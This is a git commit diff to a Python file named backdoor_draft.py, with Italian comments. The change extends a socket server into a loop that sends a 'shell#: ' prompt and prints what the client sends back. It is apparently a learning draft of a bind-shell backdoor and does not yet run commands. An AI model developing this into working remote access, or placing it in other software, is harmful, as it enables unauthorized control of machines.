299e64031e791f4185c209805aab6cfb11c2cae0
Paolo Rampino <liadserv@gmail.com>
2026-03-11 05:30:56 -0400

    UP

--- backdoor_draft.py
+++ backdoor_draft.py
@@ -16,6 +16,22 @@ s.listen(1)
 
 print("Server avviato, sono in attesa di connessione ...")
 # Arrivati a questo punto quando do s.accept() attedera' che una connessione venga stabilita
-s.accept()
+# accept crea una tupla, la connessione stessa e delle informazioni
+connection, address = s.accept()
+# a questo punto il programma riprende
+print("Connesso con:", address)
+# avvio un ciclo infinito
+while True:
+    # mando un messaggio
+    connection.sendall(b"shell#: ")
+    # attendo la sua risposta per max 1024 caratteri
+    data = connection.recv(1024)
+    # se chiude la connessione chiudo il ciclo infinito
+    if not data: break
+    # stampo quello la domanda dell'utente
+    print(data.decode("utf-8"))
+
+# se esce dal ciclo chiudo la connessione, cosi' libero la porta
+connection.close()
 
 
